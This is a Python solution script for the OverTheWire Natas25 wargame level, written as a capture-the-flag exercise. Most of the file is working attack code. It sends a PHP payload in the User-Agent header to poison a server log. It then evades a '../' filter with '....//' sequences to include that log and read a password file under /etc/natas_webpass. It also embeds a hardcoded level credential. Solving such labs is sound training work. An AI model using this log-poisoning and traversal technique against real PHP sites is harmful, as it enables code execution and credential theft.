# Natas25 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL     = "http://natas25.natas.labs.overthewire.org/"

auth_name = 'natas25'
auth_pass = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# This challenge consists of two major steps
# 1. To use the log-saving function to inject
#    PHP which can reveal the password.
# 2. To create path traversal to the injected PHP code,
#    however, the challenge will replace
#    any occurence of '../' with ''.

COOKIES = dict(PHPSESSID=s.get(URL).cookies['PHPSESSID'])

# Avoiding the "replace('../','')"
path    = "....//....//....//....//....//"
PARAMS  = dict(lang=path+"var/www/natas/natas25/logs/natas25_"+COOKIES.get("PHPSESSID")+".log" )

# The 'User-Agent' header is saved in the logs, and is open to PHP injection.
injection = '<?php readfile("/etc/natas_webpass/natas26") ?>'
HEADERS = {'User-Agent':injection}

r = s.post(URL, params=PARAMS, headers=HEADERS)
for x in r.iter_lines():
    if "]" in x:
        print x